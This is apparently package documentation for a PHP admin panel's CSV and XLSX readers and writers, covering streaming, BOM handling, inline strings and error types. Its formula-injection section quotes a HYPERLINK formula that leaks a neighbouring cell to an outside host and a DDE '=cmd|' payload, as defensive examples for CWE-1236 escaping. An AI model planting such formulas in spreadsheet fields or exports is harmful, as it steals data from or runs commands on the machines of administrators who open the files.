# CSV And XLSX

Both file formats are read and written by the package itself, without a spreadsheet dependency: `PandaPanel\Support\Spreadsheet\Csv` and `PandaPanel\Support\Spreadsheet\Xlsx`. You rarely call either directly — an [exporter](exporters.md) and an [importer](importers.md) do it for you — but you will want to know what they guarantee, and what the XLSX writer deliberately does not do.

Reach for this page when a file does not open the way somebody expected, when you need to write a spreadsheet outside the panel, or before deciding to reach for a spreadsheet library.

## A minimal working example

```php
use PandaPanel\Support\Spreadsheet\Csv;
use PandaPanel\Support\Spreadsheet\Xlsx;

$path = storage_path('app/private/report.csv');

$handle = Csv::open($path);

Csv::write($handle, ['Name', 'Email']);
Csv::write($handle, ['Grace Hopper', 'grace@example.test']);

fclose($handle);

foreach (Csv::read($path) as $row) {
    // ['Name', 'Email'], then ['Grace Hopper', 'grace@example.test']
}

Xlsx::write(storage_path('app/private/report.xlsx'), [
    ['Name', 'Email'],
    ['Grace Hopper', 'grace@example.test'],
]);
```

Both sides stream. An export of fifty thousand records assembled in memory is a memory limit waiting to happen, and an import read with `file()` is the same failure from the other direction.

## `SpreadsheetFormat`

```php
use PandaPanel\Actions\Enums\SpreadsheetFormat;

SpreadsheetFormat::Csv;     // 'csv'
SpreadsheetFormat::Xlsx;    // 'xlsx'
```

| Method | Signature | `Csv` | `Xlsx` |
| --- | --- | --- | --- |
| `label` | `label(): string` | `CSV` | `Excel (XLSX)` |
| `extension` | `extension(): string` | `csv` | `xlsx` |
| `mimeTypes` | `mimeTypes(): array` | `text/csv`, `text/plain`, `application/csv` | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`, `application/zip` |
| `fromPath` | `static fromPath(string $path): self` | anything not ending in `.xlsx` | a `.xlsx` extension, case-insensitively |

```php
SpreadsheetFormat::fromPath('/tmp/people.XLSX');   // SpreadsheetFormat::Xlsx
SpreadsheetFormat::fromPath('/tmp/people.txt');    // SpreadsheetFormat::Csv
```

The enum is closed because each case maps to a reader and a writer this package ships. A format nobody wrote a reader for is not a format the panel can offer, and saying so in the type beats discovering it at runtime.

An extension is a claim, not proof — which is why the reader still has to cope with a file that is not what it says, and why an XLSX that is not a zip raises `SpreadsheetException` rather than producing nonsense.

## `Csv`

```php
use PandaPanel\Support\Spreadsheet\Csv;

Csv::open(string $path);                                                     // returns a write handle
Csv::write($handle, array $row, bool $escapeFormulas = true): void;
Csv::neutralize(string $value): string;
Csv::read(string $path): Generator;                                          // Generator<int, list<string>>
```

### `open()`

```php
$handle = Csv::open($path);
```

Opens the file with `wb` and writes a UTF-8 byte-order mark before returning the handle. The BOM is what makes Excel read UTF-8 as UTF-8 instead of as the host's code page, which is the difference between a name and mojibake. A path that cannot be opened throws `SpreadsheetException`.

Close it yourself with `fclose()` when you are done.

### `write()`

```php
Csv::write($handle, ['Grace Hopper', 'grace@example.test']);
Csv::write($handle, $row, escapeFormulas: false);
```

One row per call, through `fputcsv($handle, $row, escape: '')`. The empty escape character means PHP's own backslash escaping stays out of the way and the file is quoted the way every spreadsheet expects.

### `neutralize()` and formula injection

```php
Csv::neutralize('=HYPERLINK("http://x?"&A1,"Click")');   // "'=HYPERLINK(…"
Csv::neutralize('Grace Hopper');                         // 'Grace Hopper'
```

A CSV cell beginning with any of `=`, `+`, `-`, `@`, a tab, or a carriage return is a formula as far as Excel, LibreOffice and Sheets are concerned, and they evaluate it when the file is opened. `=HYPERLINK("http://x?"&A1,"Click")` exfiltrates the row beside it to whoever typed it; `=cmd|'/c calc'!A1` is worse. The attacker is anyone who can write into a text field and the victim is the administrator who opens the export — which is exactly the shape of an admin panel. It is CWE-1236, and CSV quoting does not prevent it: quoting is about parsing the file, not about what the cell means once parsed.

Tab and carriage return are in the list because Excel strips leading whitespace before deciding, so `"\t=cmd"` is still a formula.

The fix is a leading apostrophe, which every spreadsheet reads as "this cell is text" and does not display. It changes the bytes, which is why `Exporter::escapesFormulas()` can turn it off for a feed another *program* parses — there, nothing evaluates anything and the apostrophe would be corruption rather than a fix.

XLSX needs none of this: `Xlsx` writes `t="inlineStr"` cells, and a formula in that format lives in an `<f>` element the writer never emits. A literal `=SUM(A1)` in an inline string is shown, not run.

### `read()`

```php
foreach (Csv::read($path) as $row) {
    // list<string>
}

$firstRow = null;

foreach (Csv::read($path) as $row) {
    $firstRow = $row;
    break;                 // the rest of the file is never read
}
```

A generator, so a caller decides how much of the file it wants — which is what makes a header-only peek cheap. Three things it does on the way:

- A blank line (`[null]` or `['']`) is skipped rather than read as a record.
- Every cell is cast to a string; a `null` cell becomes `''`.
- A byte-order mark is stripped from the **first cell of the first row**, or the first heading is named `\u{FEFF}id` and matches nothing in the mapping step.

A path that cannot be opened throws `SpreadsheetException`. The handle is closed in a `finally`, so an abandoned generator does not leak it.

## `Xlsx`

```php
use PandaPanel\Support\Spreadsheet\Xlsx;

Xlsx::write(string $path, iterable $rows, string $sheetName = 'Sheet1'): void;
Xlsx::read(string $path, int $maxXmlPartBytes = 67108864): Generator;    // Generator<int, list<string>>
```

An XLSX is a zip of XML parts, and writing one needs five of them — `[Content_Types].xml`, `_rels/.rels`, `xl/_rels/workbook.xml.rels`, `xl/workbook.xml` and `xl/worksheets/sheet1.xml`. That is why this exists instead of a spreadsheet library: the library would be a dependency decision, and this is a hundred lines of a format that has not changed since 2007.

### `write()`

```php
Xlsx::write($path, [
    ['Name', 'Email'],
    ['Grace Hopper', 'grace@example.test'],
], sheetName: 'Users');
```

Rows arrive as an `iterable`, so an export hands over a lazy chunked query rather than an array of everything:

```php
use Generator;

function rows(): Generator
{
    yield ['Reference', 'Total'];

    foreach (Order::query()->lazy(500) as $order) {
        yield [$order->reference, (string) $order->total];
    }
}

Xlsx::write($path, rows());
```

Every cell is written as an **inline string** (`t="inlineStr"`). A number written as an inline string is shown as typed, which is what you want for an order reference or a zero-padded code — the two places a spreadsheet's helpfulness destroys data:

```php
Xlsx::write($path, [['code'], ['007']]);
// reads back as '007', not 7
```

Two things are cleaned on the way in: control characters illegal in XML are removed (one of them would make the whole file unopenable), and markup is escaped with `htmlspecialchars(… ENT_QUOTES | ENT_XML1 …)` so `<b>bold</b> & "quoted"` is written as text and reads back identically.

A path that `ZipArchive` cannot open for writing throws `SpreadsheetException`.

### What the writer deliberately does not do

| Not supported | Why |
| --- | --- |
| styles, fonts, colours | an export is a table of values |
| formulas | the same reason `neutralize()` exists |
| multiple sheets | one sheet, `sheet1.xml` |
| date cells | dates are formatted to `Y-m-d H:i:s` before they get here |
| a shared-strings table | it is a second pass over everything to build, which is the wrong trade for an export that streams |
| column widths, freeze panes, filters | none of them survive a round trip through a CSV either |

A value that needs formatting is formatted before it gets here — that is what `ExportColumn::formatUsing()` is for.

### `read()`

```php
foreach (Xlsx::read($path) as $row) {
    // list<string>
}
```

Reads the **first sheet only**, looking for `xl/worksheets/sheet1.xml` and then `xl/worksheets/Sheet1.xml`. What it copes with:

- **Shared strings.** A workbook written by Excel puts its strings in `xl/sharedStrings.xml`, and `s`-typed cells are resolved through it. A string with mixed formatting is split across `<r>` runs and is joined back together, because taking only `<t>` would drop every styled word.
- **Inline strings**, which is what this writer produces.
- **Anything else** falls back to the cell's `<v>` — which is how a numeric cell written by Excel reads back as its number.
- **Gaps.** A spreadsheet omits empty cells entirely, so `A1` and `C1` arrive as two cells and the second is *not* the second column. Each cell's `r` reference is decoded back into a position and the row is filled to the last cell that had a value, so a blank cell in the middle does not shift every value after it.

Each XML part read from the zip is capped at 64 MiB by default before it is handed to SimpleXML, and
XML is parsed with network access disabled. The second parameter exists for tests and tightly
controlled imports that want a smaller cap; raising it is a memory decision.

Failures raise `SpreadsheetException`: a file that is not a zip (`That file is not a readable spreadsheet.`), an XML part above the cap (`That spreadsheet is too large to read safely.`), XML that will not parse (`That spreadsheet could not be read.`), and a workbook with no readable first sheet (`That workbook has no readable sheet.`).

## `SpreadsheetException`

```php
use PandaPanel\Support\Spreadsheet\SpreadsheetException;   // extends RuntimeException
```

Its own type so an import can tell "this file is not a spreadsheet" apart from "this row is invalid". The first is a failed upload the user should be told about once; the second is a row to collect and hand back in the [failure report](failure-reports.md).

In a queued import it reaches `RunPanelImport::failed()`, whose notification carries the exception's own message — a reader that says *"That file is not a readable spreadsheet."* is telling somebody how to fix their file.

## Which format is used where

| Situation | Format |
| --- | --- |
| export dialog | whichever the user picked from `Exporter::formats()` |
| import upload | decided per file by `SpreadsheetFormat::fromPath()` |
| failure report | always CSV, whatever the upload was |

The report is always CSV because it is a file to correct and re-upload, and a CSV opens everywhere.

## Notes

- **Reading needs a real filesystem path.** A CSV streams from a handle and an XLSX is a zip `ZipArchive` opens by name, so neither can read from a remote disk directly. That is why an importer's disk must be a local one.
- **Writing goes via a temporary file.** `ExportRun` writes to `tempnam(sys_get_temp_dir(), 'panel-export-')` and then streams the result onto the target disk, so the target may be remote even though the writer is not.
- **The CSV reader trusts the file's own row lengths.** A row with fewer cells than the header has no value at the missing positions, and the column mapped there reads `''`.
- **`fromPath()` never sniffs content.** A `.csv` file that is really an XLSX is read as a CSV and produces gibberish rows rather than an error.
- **The BOM is written on every CSV**, including the failure report. Anything consuming these files programmatically should expect it.

## See also

- [Exporter classes](exporters.md) — `escapesFormulas()`, `formats()`, `chunkSize()`
- [Importer classes](importers.md)
- [Columns and mapping](columns-mapping.md)
- [Failure reports](failure-reports.md)
- [Storage and cleanup](storage-cleanup.md)
- [Import and export actions](../actions/import-export.md)
- [Testing helpers](../testing/helpers.md)
